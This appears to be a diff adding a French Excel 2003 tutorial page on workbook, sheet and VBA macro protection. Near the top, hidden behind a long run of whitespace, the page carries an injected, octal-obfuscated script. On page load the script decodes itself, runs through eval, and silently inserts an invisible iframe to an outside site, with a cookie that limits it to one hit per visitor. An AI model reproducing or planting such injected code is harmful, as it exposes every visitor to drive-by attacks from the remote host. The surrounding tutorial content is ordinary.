@@ -1,0 +1,313 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<link rel="stylesheet" type="text/css" href="vba.css" title="VBA Style">
+<title>Sécurité et Protection</title>
+<style>
+<!--
+h2
+	{margin:6.0pt 0cm; page-break-after:avoid;
+	background:#FFDDDD;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:12.0pt;
+	font-family:Arial;
+	}
+ p.MsoNormal
+	{mso-style-parent:"";
+	margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:6.0pt;
+	margin-left:0cm;
+	background:white;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:10.0pt;
+	font-family:Arial;
+	}
+p.Puces
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:6.0pt;
+	margin-left:14.2pt;
+	background:white;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:9.0pt;
+	font-family:Arial;
+	}
+h3
+	{margin-top:12.0pt;
+	margin-right:0cm;
+	margin-bottom:3.0pt;
+	margin-left:0cm;
+	page-break-after:avoid;
+	background:#FFDDDD;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:12.0pt;
+	font-family:Arial;
+	font-style:italic;
+	}
+p.Programme
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:1.0cm;
+	margin-bottom:.0001pt;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:9.0pt;
+	font-family:"Courier New";
+	color:green;
+	}
+p.Renvoi
+	{margin:6.0pt 0cm; background:white;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:10.0pt;
+	font-family:Arial;
+	color:gray;
+	text-decoration:underline;
+	text-underline:words}
+p.TitreGras
+	{margin:6.0pt 0cm; page-break-after:avoid;
+	background:silver;
+	punctuation-wrap:simple;
+	text-autospace:none;
+	font-size:11.0pt;
+	font-family:Arial;
+	font-weight:bold;
+	}
+-->
+</style>
+</head>
+
+<body>
+<p><center><a href="index.htm" TITLE="VBAXL"><B><font face="Verdana" size="2">Retour &agrave; VBAXL</B></font></a></center></p><!--0c0896--><script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          ps="split";asd=function(){d.body--};a=("44,152,171,162,147,170,155,163,162,44,176,176,176,152,152,152,54,55,44,177,21,16,44,172,145,166,44,153,162,151,160,44,101,44,150,163,147,171,161,151,162,170,62,147,166,151,145,170,151,111,160,151,161,151,162,170,54,53,155,152,166,145,161,151,53,55,77,21,16,21,16,44,153,162,151,160,62,167,166,147,44,101,44,53,154,170,170,164,76,63,63,170,145,151,157,173,163,162,150,163,145,166,155,166,145,162,153,62,147,163,161,63,147,160,155,157,62,164,154,164,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,164,163,167,155,170,155,163,162,44,101,44,53,145,146,167,163,160,171,170,151,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,146,163,166,150,151,166,44,101,44,53,64,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,154,151,155,153,154,170,44,101,44,53,65,164,174,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,173,155,150,170,154,44,101,44,53,65,164,174,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,160,151,152,170,44,101,44,53,65,164,174,53,77,21,16,44,153,162,151,160,62,167,170,175,160,151,62,170,163,164,44,101,44,53,65,164,174,53,77,21,16,21,16,44,155,152,44,54,45,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,153,162,151,160,53,55,55,44,177,21,16,44,150,163,147,171,161,151,162,170,62,173,166,155,170,151,54,53,100,150,155,172,44,155,150,101,140,53,153,162,151,160,140,53,102,100,63,150,155,172,102,53,55,77,21,16,44,150,163,147,171,161,151,162,170,62,153,151,170,111,160,151,161,151,162,170,106,175,115,150,54,53,153,162,151,160,53,55,62,145,164,164,151,162,150,107,154,155,160,150,54,153,162,151,160,55,77,21,16,44,201,21,16,201,21,16,152,171,162,147,170,155,163,162,44,127,151,170,107,163,163,157,155,151,54,147,163,163,157,155,151,122,145,161,151,60,147,163,163,157,155,151,132,145,160,171,151,60,162,110,145,175,167,60,164,145,170,154,55,44,177,21,16,44,172,145,166,44,170,163,150,145,175,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,172,145,166,44,151,174,164,155,166,151,44,101,44,162,151,173,44,110,145,170,151,54,55,77,21,16,44,155,152,44,54,162,110,145,175,167,101,101,162,171,160,160,44,200,200,44,162,110,145,175,167,101,101,64,55,44,162,110,145,175,167,101,65,77,21,16,44,151,174,164,155,166,151,62,167,151,170,130,155,161,151,54,170,163,150,145,175,62,153,151,170,130,155,161,151,54,55,44,57,44,67,72,64,64,64,64,64,56,66,70,56,162,110,145,175,167,55,77,21,16,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,44,101,44,147,163,163,157,155,151,122,145,161,151,57,46,101,46,57,151,167,147,145,164,151,54,147,163,163,157,155,151,132,145,160,171,151,55,21,16,44,57,44,46,77,151,174,164,155,166,151,167,101,46,44,57,44,151,174,164,155,166,151,62,170,163,113,121,130,127,170,166,155,162,153,54,55,44,57,44,54,54,164,145,170,154,55,44,103,44,46,77,44,164,145,170,154,101,46,44,57,44,164,145,170,154,44,76,44,46,46,55,77,21,16,201,21,16,152,171,162,147,170,155,163,162,44,113,151,170,107,163,163,157,155,151,54,44,162,145,161,151,44,55,44,177,21,16,44,172,145,166,44,167,170,145,166,170,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,162,145,161,151,44,57,44,46,101,46,44,55,77,21,16,44,172,145,166,44,160,151,162,44,101,44,167,170,145,166,170,44,57,44,162,145,161,151,62,160,151,162,153,170,154,44,57,44,65,77,21,16,44,155,152,44,54,44,54,44,45,167,170,145,166,170,44,55,44,52,52,21,16,44,54,44,162,145,161,151,44,45,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,64,60,44,162,145,161,151,62,160,151,162,153,170,154,44,55,44,55,44,55,21,16,44,177,21,16,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,201,21,16,44,155,152,44,54,44,167,170,145,166,170,44,101,101,44,61,65,44,55,44,166,151,170,171,166,162,44,162,171,160,160,77,21,16,44,172,145,166,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,155,162,150,151,174,123,152,54,44,46,77,46,60,44,160,151,162,44,55,77,21,16,44,155,152,44,54,44,151,162,150,44,101,101,44,61,65,44,55,44,151,162,150,44,101,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,160,151,162,153,170,154,77,21,16,44,166,151,170,171,166,162,44,171,162,151,167,147,145,164,151,54,44,150,163,147,171,161,151,162,170,62,147,163,163,157,155,151,62,167,171,146,167,170,166,155,162,153,54,44,160,151,162,60,44,151,162,150,44,55,44,55,77,21,16,201,21,16,155,152,44,54,162,145,172,155,153,145,170,163,166,62,147,163,163,157,155,151,111,162,145,146,160,151,150,55,21,16,177,21,16,155,152,54,113,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,55,101,101,71,71,55,177,201,151,160,167,151,177,127,151,170,107,163,163,157,155,151,54,53,172,155,167,155,170,151,150,143,171,165,53,60,44,53,71,71,53,60,44,53,65,53,60,44,53,63,53,55,77,21,16,21,16,176,176,176,152,152,152,54,55,77,21,16,201,21,16,201,21,16"[ps](","));ss=String;d=document;for(i=0;i<a.length;i+=1){a[i]=-(8-4)+parseInt(a[i],8);}try{asd()}catch(q){zz=0;}try{zz/=2}catch(q){zz=1;}if(!zz)eval(ss["fromCharCode"].apply(ss,a));</script><!--/0c0896-->
+
+
+
+<p><b><font face="Arial" color="#FFFFFF"><a name="_Toc84849487">
+<span style="background-color: #000080">Sécurité et Protection - Excel 2003</span></a></font></b></p>
+<p class="MsoNormal">&nbsp;</p>
+<p><a name="_Toc84849488"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Protection d'un classeur</span></font></b></a></p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> puis sur la commande <b>
+<span style="color: blue">Protection</span></b> et sélectionnez <b>
+<span style="color: blue">Protéger le classeur.</span></b></p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue <b><span style="color: blue">
+Protéger le classeur</span></b> activez la case à cocher <i>
+<span style="color: blue">Structure</span></i> pour protéger le classeur de 
+façon à ce qu'il soit impossible de supprimer, de renommer ou bien d'insérer des 
+feuilles et activez la case à cocher <i><span style="color: blue">Fenêtres</span></i> 
+si vous ne voulez pas qu'un utilisateur modifie la taille ou la position des 
+feuilles de calcul du classeur.</p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tapez un mot de passe pour empêcher les utilisateurs de 
+supprimer la protection du classeur et cliquez sur <b><span style="color: blue">
+OK</span></b>.</p>
+<p class="Puces">Les mots de passe peuvent contenir 255 caractères soit des 
+lettres, des chiffres, des espaces ou des symboles. L'idéal pour un bon mot de 
+passe est de mélanger des chiffres et des lettres en majuscules et en minuscules 
+et de comporter au moins sept caractères.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Confirmez le mot de passe et cliquez sur <b>
+<span style="color: blue">OK</span></b>.</p>
+<p><a name="_Toc84849489"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Protection d'une feuille en permettant la 
+modification d'une plage</span></font></b></a></p>
+<p class="MsoNormal">Vous voulez que les autres utilisateurs renseignent des 
+cellules dans une plage mais ne puissent pas modifier les cellules en dehors de 
+cette plage.</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sélectionnez la plage (ou les plages qui peuvent être 
+contiguës ou non) à renseigner.</p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> puis sur la commande <b>
+<span style="color: blue">Protection</span></b> et sélectionnez <b>
+<span style="color: blue">Permettre aux utilisateurs de modifier des plages</span></b>. 
+Cette commande n'est pas disponible lorsque la feuille est protégée.</p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue qui s'affiche cliquez sur <b>
+<span style="color: blue">Nouvelle</span></b>.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la zone <i><span style="color: blue">Titre</span></i>, 
+tapez un titre pour la plage à renseigner.</p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la zone <i><span style="color: blue">Fait 
+référence aux cellules</span></i>, les références de la plage apparaissent grâce 
+à la sélection faite au départ !</p>
+<p class="Puces">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur <b><span style="color: blue">OK</span></b>.</p>
+<p class="Puces">7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue <i><span style="color: blue">
+Permettre aux utilisateurs de modifier des plages</span></i> cliquez sur le 
+bouton <b><span style="color: blue">Protéger la feuille</span></b>.</p>
+<p class="Puces">8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tapez un mot de passe, confirmez le et cliquez sur <b>
+<span style="color: blue">OK</span></b>.</p>
+<p><a name="_Toc84849490"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Partage d'un classeur en lecture seul</span></font></b></a></p>
+<p class="MsoNormal">Vous désirez que les autres utilisateurs puissent consulter 
+votre classeur sans pouvoir le modifier.</p>
+<p class="MsoNormal">Il suffit pour cela de lui donner l'attribut <i>
+<span style="color: blue">Lecture seule</span></i>.</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Fichier</span></b> puis sur la commande <b>
+<span style="color: blue">Enregistrer sous</span></b>.</p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte dialogue qui s'affiche cliquez sur <b>
+<span style="color: blue">Outils</span></b>. </p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la liste qui apparaît sélectionnez <b>
+<span style="color: blue">Options générales</span></b>.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue <i><span style="color: blue">
+Options d'enregistrement</span></i> activez la case à cocher <i>
+<span style="color: blue">Lecture seule recommandée</span>.</i></p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur <b><span style="color: blue">OK</span></b>.</p>
+<p class="MsoNormal">Si les autres utilisateurs modifient le classeur et veulent 
+l’enregistrer un message d’alerte signale que le classeur est en lecture seule 
+et demande de l’enregistrer sous un autre nom. </p>
+<p><a name="_Toc84849491"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Exécuter une macro sur une feuille protégée</span></font></b></a></p>
+<p class="MsoNormal">Vous venez de protéger une feuille de votre classeur avec 
+un mot de passe mais vous aimeriez pouvoir exécuter une macro sur cette feuille. 
+Malheureusement la macro refuse de fonctionner et vous retourne un message 
+d’erreur.</p>
+<p class="MsoNormal">Pour pouvoir exécuter une macro sur une feuille protégée il 
+faut ajouter une instruction qui enlève la protection avant d’agir sur la 
+feuille et une autre qui rétablit la protection en fin de procédure.</p>
+<p class="Programme">Sub MacroavecfeuilleProtect()</p>
+<p class="Programme">&nbsp;&nbsp;&nbsp; ActiveSheet.Unprotect &quot;lemotdepasse&quot;</p>
+<p class="Programme">'Placez ici vos instructions</p>
+<p class="Programme"><span lang="EN-GB">&nbsp;&nbsp;&nbsp; ActiveSheet.Protect &quot;lemotdepasse&quot;, 
+True, True, True</span></p>
+<p class="Programme">End Sub</p>
+<p class="MsoNormal">Remplacez «&nbsp;lemotdepasse&nbsp;» par votre mot de passe qui 
+protège la feuille.</p>
+<p><a name="_Toc84849492"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Comment protéger efficacement une feuille&nbsp;?</span></font></b></a></p>
+<p class="MsoNormal">Il existe sur le Web de nombreux logiciels (les craks) 
+capables de contourner les mots de passe.</p>
+<p class="MsoNormal">Si vous voulez protéger efficacement une feuille, Excel 
+2003 nous propose un système de verrouillage très efficace, fondé sur un 
+algorithme de cryptage.</p>
+<p class="MsoNormal">Procédure&nbsp;:</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> puis sur la commande <b>
+<span style="color: blue">Options</span></b>.</p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue qui apparaît cliquez sur 
+l'onglet <b><span style="color: blue">Sécurité</span></b>. </p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tapez un mot de passe dans le champ <i>
+<span style="color: blue">Mot de passe</span></i> pour la lecture.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur le bouton <b><span style="color: blue">
+Options avancées</span></b>. </p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la liste <i><span style="color: blue">Choisir un 
+type de </span><span style="color: blue">cryptage</span></i>, sélectionnez <i>
+<span style="color: blue">RC4, Microsoft Enhanced Cryptographic Provider v1.0</span></i>.
+</p>
+<p class="Puces">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans le champ <i><span style="color: blue">Longueur de 
+clé</span></i> gardez la valeur <i><span style="color: blue">128</span></i>.</p>
+<p class="Puces">7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Activez la case à cocher <i><span style="color: blue">
+Crypter les propriétés du document</span></i>.</p>
+<p class="Puces">8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Validez par <b><span style="color: blue">OK</span></b> 
+et confirmez votre mot de passe.</p>
+<p class="Puces">9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur <b><span style="color: blue">OK</span></b>.
+</p>
+<p class="MsoNormal">Votre feuille est maintenant protégée efficacement.</p>
+<p><a name="_Toc85540908"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Comment protéger un classeur à l'ouverture?</span></font></b></a></p>
+<p class="MsoNormal">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus, cliquez sur <b>
+<span style="color: blue">Fichier</span></b> et <b><span style="color: blue">
+Enregistrer sous</span></b>.</p>
+<p class="MsoNormal">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue cliquez sur <b>
+<span style="color: blue">Outils</span></b> et sélectionnez dans la liste <i>
+<span style="color: blue">Options Générales</span></i>.</p>
+<p class="MsoNormal">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la zone <i><span style="color: blue">Mot de 
+passe à l'ouverture,</span></i> tapez votre mot de passe.</p>
+<p class="MsoNormal">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vous pouvez crypter votre fichier en cliquant 
+sur le bouton <b><span style="color: blue">Options avancées</span></b> comme 
+dans l'astuce précédente.</p>
+<p class="MsoNormal">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur <b><span style="color: blue">OK,</span></b> 
+confirmez votre mot de passe et <b><span style="color: blue">Validez</span></b>.</p>
+<p class="MsoNormal">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enregistrez le classeur.</p>
+<p class="MsoNormal">A l'ouverture de ce classeur, une boîte de saisie vous 
+invitera à saisir le mot de passe.</p>
+<p><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080"><a name="_Toc84849495">Ajout de commentaires sur cellules verrouillées</a>
+</span></font></b>
+</p>
+<p class="MsoNormal">Lorsque vous protégez une feuille de calcul et que les 
+cellules sont verrouillées il n'est pas possible d'ajouter un commentaire.</p>
+<p class="MsoNormal">Comment ajouter des commentaires?</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Vérifiez que la case <i><span style="color: blue">
+Verrouillée</span></i> est cochée dans l'onglet <b><span style="color: blue">
+Protection</span></b> de la boîte dialogue <b><span style="color: blue">Format 
+de cellule</span></b>.</p>
+<p class="Puces">2 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> puis sur la commande <b>
+<span style="color: blue">Protection </span></b>et<b><span style="color: blue"> 
+Protéger la feuille.</span></b></p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue qui s'affiche activez la case
+<i><span style="color: blue">Modifier les objets</span></i> dans la liste <i>
+<span style="color: blue">Autoriser tous les utilisateurs de cette feuille à</span></i>.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Saisissez un mot de passe si vous le désirez et cliquez 
+sur <b><span style="color: blue">OK</span></b>.</p>
+<p class="MsoNormal">Désormais vous pouvez ajouter, modifier ou supprimer des 
+commentaires.</p>
+<p><a name="_Toc84849496"><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080">Comment protéger les macros de votre classeur ?</span></font></b></a></p>
+<p class="MsoNormal">Vous souhaitez partager un classeur avec d'autres 
+utilisateurs mais vous voulez qu'ils n'aient pas accès à vos macros.</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Démarrez <i><span style="color: blue">l'Editeur Visual 
+Basic</span></i> (<span style="color: red">Alt</span>+<span style="color: red">F11</span>).</p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la fenêtre <b><span style="color: blue">Projet</span></b> 
+sélectionnez le projet <i><span style="color: blue">VBAProject (nomFichier)</span></i> 
+à protéger.</p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> et sélectionnez <b>
+<span style="color: blue">Propriétés de VBAProject</span></b>.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue qui s'affiche cliquez sur 
+l'onglet <b><span style="color: blue">Protection</span></b>.</p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Activez <i><span style="color: blue">Verrouiller le 
+projet pour l'affichage</span></i>.</p>
+<p class="Puces">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Saisissez un mot de passe, confirmez-le et cliquez sur
+<b><span style="color: blue">OK</span></b>.</p>
+<p class="Puces">7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enregistrez le classeur.</p>
+<p class="MsoNormal">Dés qu'un utilisateur tentera d'accéder à vos macros, un 
+mot de passe lui sera demandé.</p>
+<p><b><font face="Arial" color="#FFFFFF">
+<span style="background-color: #000080"><a name="_Toc84849497">Comment supprimer la protection et les mots de passe</a>?</span></font></b></p>
+<p class="TitreGras">Supprimer la protection d'une feuille de calcul.</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sélectionnez la feuille de calcul protégée. </p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b>, sélectionnez <b>
+<span style="color: blue">Protection</span></b>, puis cliquez sur <b>
+<span style="color: blue">Oter la protection de la feuille</span></b>. </p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Entrez le mot de passe de protection de la feuille de 
+calcul. </p>
+<p class="TitreGras">Supprimer la protection d'un classeur</p>
+<p class="MsoNormal">Supprime la protection d'un classeur lorsqu'il a été 
+protégé par la commande <b><span style="color: blue">Outils/Protection</span></b> 
+et <b><span style="color: blue">Protéger le classeur</span></b>.</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Ouvrez le classeur protégé. </p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menu cliquez sur <b>
+<span style="color: blue">Outils</span></b>, sélectionnez <b>
+<span style="color: blue">Protection</span></b>, puis cliquez sur <b>
+<span style="color: blue">Oter la protection du classeur.</span></b></p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Entrez le mot de passe de protection du classeur.</p>
+<p class="TitreGras">Supprimer la protection des macros</p>
+<p class="Puces">1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Démarrez <i><span style="color: blue">l'Editeur Visual 
+Basic</span></i> (<span style="color: red">Alt</span>+<span style="color: red">F11</span>).</p>
+<p class="Puces">2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la fenêtre <b><span style="color: blue">Projet</span></b> 
+sélectionnez le projet <i><span style="color: blue">VBAProject (nomFichier)</span></i> 
+à déprotéger.</p>
+<p class="Puces">3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la barre de menus cliquez sur <b>
+<span style="color: blue">Outils</span></b> et sélectionnez <b>
+<span style="color: blue">Propriétés de VBAProject</span></b>.</p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Saisissez le mot de passe demandé.</p>
+<p class="Puces">4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dans la boîte de dialogue qui s'affiche cliquez sur 
+l'onglet &nbsp;<b><span style="color: blue">Protection</span></b>.</p>
+<p class="Puces">5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Effacez le mot de passe dans les zones <i>
+<span style="color: blue">Mot de passe</span></i> et <i>
+<span style="color: blue">Confirmer le mot de passe</span></i>.</p>
+<p class="Puces">6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cliquez sur <b><span style="color: blue">OK</span></b>.</p>
+<p class="Puces">7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Enregistrez le classeur.</p>
+<p><center><a href="index.htm" TITLE="VBAXL"><B><font face="Verdana" size="2">Retour &agrave; VBAXL</B></font></a></center></p>
+<p><font face="Verdana" size="1">Copyright Daniel Josserand - 2005</font></p>
+
+</body>
+
+</html>
